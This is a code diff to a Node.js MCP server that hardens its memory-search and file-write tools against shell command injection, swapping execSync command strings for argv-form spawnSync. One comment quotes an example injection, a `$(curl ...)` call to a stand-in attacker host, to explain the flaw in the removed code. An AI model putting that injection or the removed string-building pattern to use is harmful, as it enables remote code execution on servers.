@@ -2,7 +2,7 @@ import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
 import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';
 import { z } from 'zod';
 import { readFile, writeFile, stat, readdir, access } from 'fs/promises';
-import { execSync, spawnSync } from 'child_process';
+import { spawnSync } from 'child_process';
 import { join } from 'path';
 import { randomUUID } from 'crypto';
 import { isInitializeRequest } from '@modelcontextprotocol/sdk/types.js';
@@ -304,30 +304,42 @@ server.tool(
   },
   async ({ query, limit }) => {
     const maxResults = limit || 5;
-    try {
-      const escaped = query.replace(/"/g, '\\"');
-      const cmd = `docker exec clawdbot-v3-openclaw-gateway-1 node /home/node/clawd/bin/memory_search_fts "${escaped}" --limit ${maxResults}`;
-      const stdout = execSync(cmd, { timeout: 10000, encoding: 'utf-8' });
-      // Parse BM25 output — format varies, return raw results
-      const lines = stdout.trim().split('\n').filter(Boolean);
-      const results = lines.map(line => {
-        // Try to parse "score: N.NN | text" format
-        const scoreMatch = line.match(/^score:\s*([\d.]+)\s*\|\s*(.+)$/);
-        if (scoreMatch) {
-          return { score: parseFloat(scoreMatch[1]), text: scoreMatch[2] };
-        }
-        return { score: 0, text: line };
-      });
-      const out = { results, query, total_matches: results.length };
-      const notices = await siloNoticesForRead();
-      if (notices) out._silo_notices = notices;
-      return successResult(out);
-    } catch (err) {
-      if (err.killed) {
-        return errorResult('SEARCH_TIMEOUT', 'BM25 search timed out after 10 seconds');
-      }
-      return errorResult('DOCKER_ERROR', `Docker exec failed: ${err.message}`);
+    // Use spawnSync with an argv array so the query NEVER reaches a shell.
+    // Previously this built a docker-exec command string with execSync,
+    // escaping only `"` — bash inside double quotes still expands $(...)
+    // and backticks, so a query like `$(curl evil.example.com)` would
+    // execute as root on the VPS. argv form passes the query as a single
+    // argument to docker; no shell interpretation happens.
+    const r = spawnSync('docker', [
+      'exec', 'clawdbot-v3-openclaw-gateway-1',
+      'node', '/home/node/clawd/bin/memory_search_fts',
+      query,
+      '--limit', String(maxResults),
+    ], { timeout: 10000, encoding: 'utf-8' });
+
+    if (r.error?.code === 'ETIMEDOUT' || r.signal === 'SIGTERM') {
+      return errorResult('SEARCH_TIMEOUT', 'BM25 search timed out after 10 seconds');
     }
+    if (r.error) {
+      return errorResult('DOCKER_ERROR', `Docker exec failed: ${r.error.message}`);
+    }
+    if (r.status !== 0) {
+      return errorResult('DOCKER_ERROR', `Docker exec exit ${r.status}: ${r.stderr || r.stdout || 'unknown'}`);
+    }
+
+    const lines = r.stdout.trim().split('\n').filter(Boolean);
+    const results = lines.map((line) => {
+      // Try to parse "score: N.NN | text" format
+      const scoreMatch = line.match(/^score:\s*([\d.]+)\s*\|\s*(.+)$/);
+      if (scoreMatch) {
+        return { score: parseFloat(scoreMatch[1]), text: scoreMatch[2] };
+      }
+      return { score: 0, text: line };
+    });
+    const out = { results, query, total_matches: results.length };
+    const notices = await siloNoticesForRead();
+    if (notices) out._silo_notices = notices;
+    return successResult(out);
   }
 );
 
@@ -446,13 +458,14 @@ server.tool(
 
     // SILO_CUTOVER_ROUTED — write_event routes through Silo's operation log
     // (v12.5 cutover 2026-04-22). The log is the authority; regen rewrites files.
+    // Paths use the SILO_DIR / SILO_BASE / SILO_CLI constants defined at the
+    // top of the file so local dev + production share one code path.
     try {
-      const { spawnSync } = await import('node:child_process');
       const bodyWithPrefix = `[desktop-claude] ${content}`;
       const writeCmd = spawnSync('node', [
-        '/root/silo/src/cli/silo.js',
+        SILO_CLI,
         'write',
-        '--silo-dir=/root/.silo',
+        `--silo-dir=${SILO_DIR}`,
         '--slug=' + slug,
         '--tag=' + tag,
         '--content=' + bodyWithPrefix,
@@ -464,16 +477,18 @@ server.tool(
           'silo CLI rejected write: ' + (writeCmd.stderr || writeCmd.stdout || 'unknown'));
       }
       const regenCmd = spawnSync('node', [
-        '/root/silo/src/cli/silo.js',
+        SILO_CLI,
         'regenerate',
-        '--silo-dir=/root/.silo',
-        '--to=/root/clawd-v3',
+        `--silo-dir=${SILO_DIR}`,
+        `--to=${SILO_BASE}`,
       ], { encoding: 'utf-8' });
       if (regenCmd.status !== 0) {
         return errorResult('SILO_REGEN_FAILED',
           'regen after write failed: ' + (regenCmd.stderr || regenCmd.stdout || 'unknown'));
       }
-      try { execSync(`chown -R 1000:1000 /root/clawd-v3/events/`); } catch { /* non-fatal */ }
+      // Restore ownership for the OpenClaw container (uid 1000) via argv-form
+      // spawnSync — no shell, no injection surface. Non-fatal on failure.
+      spawnSync('chown', ['-R', '1000:1000', join(SILO_BASE, 'events')], { encoding: 'utf-8' });
     } catch (err) {
       return errorResult('FS_ERROR', `Failed to route event through Silo: ${err.message}`);
     }
@@ -525,7 +540,7 @@ server.tool(
     // Write
     try {
       await writeFile(targetPath, content, 'utf-8');
-      try { execSync(`chown 1000:1000 "${targetPath}"`); } catch { /* non-fatal */ }
+      spawnSync('chown', ['1000:1000', targetPath], { encoding: 'utf-8' });
       const st = await stat(targetPath);
       return successResult({ success: true, path: targetPath, size_bytes: st.size });
     } catch (err) {
